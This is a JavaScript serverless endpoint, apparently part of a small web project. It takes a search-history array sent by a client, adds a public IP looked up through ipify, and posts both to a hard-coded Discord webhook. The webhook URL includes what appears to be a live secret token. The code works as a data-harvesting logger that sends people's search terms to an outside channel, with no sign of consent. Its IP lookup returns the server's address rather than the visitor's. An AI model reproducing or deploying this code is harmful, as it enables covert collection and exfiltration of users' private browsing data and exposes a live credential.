// api/log.js
import fetch from 'node-fetch';

export default async (req, res) => {
    if (req.method === 'POST') {
        console.log('Received a log request'); // Debug log

        const discordWebhookUrl = 'https://discord.com/api/webhooks/1303414607263826002/8u9YBbZiHiRm1dE2cO_wUFFYe6YFTkkouDgoZt-LIYTwVhtYJa1_AM-qDxXajHpWnnsT'; // Replace with your Discord webhook URL

        try {
            // Get the public IP
            const publicIPResponse = await fetch('https://api.ipify.org?format=json');
            const publicIPData = await publicIPResponse.json();
            const publicIP = publicIPData.ip;

            // Get search history from the request body
            const { searchHistory } = req.body; // Expecting searchHistory to be an array of search terms

            // Construct the embeds
            const embeds = [
                {
                    title: 'Public IP Logged',
                    description: `Public IP: \`${publicIP}\``,
                    color: 0x00FF00, // Green color
                    timestamp: new Date(),
                },
                {
                    title: 'Search History Logged',
                    description: searchHistory.length > 0 ? searchHistory.map(term => `- ${term}`).join('\n') : 'No search history available.',
                    color: 0x0000FF, // Blue color
                    timestamp: new Date(),
                },
            ];

            const logMessage = {
                embeds: embeds,
            };

            console.log('Sending message to Discord:', logMessage); // Debug log

            const response = await fetch(discordWebhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(logMessage),
            });

            // Check the response status
            if (!response.ok) {
                const errorText = await response.text();
                console.error('Failed to send message to Discord:', response.status, errorText);
                res.status(500).json({ message: 'Error sending to Discord' });
            } else {
                res.status(200).json({ message: 'IP and search history logged successfully' });
            }
        } catch (error) {
            console.error('Error occurred:', error);
            res.status(500).json({ message: 'Error sending to Discord' });
        }
    } else {
        res.status(405).json({ message: 'Method Not Allowed' });
    }
};
